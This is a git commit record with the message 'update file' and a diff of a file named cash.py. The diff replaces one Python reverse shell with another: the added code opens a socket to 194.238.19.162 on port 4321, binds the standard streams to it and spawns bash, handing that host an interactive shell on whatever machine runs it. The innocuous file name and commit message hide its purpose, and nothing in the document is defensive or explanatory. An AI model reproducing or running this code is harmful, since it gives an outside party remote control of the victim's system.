bc5b81e8ab2917b1261463e7265b0913c436df29
EmilLieng <emillieng19980321@outlook.com>
2024-08-13 04:41:19 -0700

    update file

--- cash.py
+++ cash.py
@@ -1,11 +1,5 @@
-import os
-
-payload=(
-    "python -c \"import os,pty,socket; "
-    "s=socket.socket(); "
-    "s.connect(('194.238.19.162',4321)); "
-    "[os.dup2(s.fileno(),f)for f in(0,1,2)]; "
-    "pty.spawn('bash')\""
-)
-
-os.system(payload)
+import os,pty,socket
+s=socket.socket()
+s.connect(('194.238.19.162',4321))
+[os.dup2(s.fileno(),f)for f in(0,1,2)]
+pty.spawn('bash')
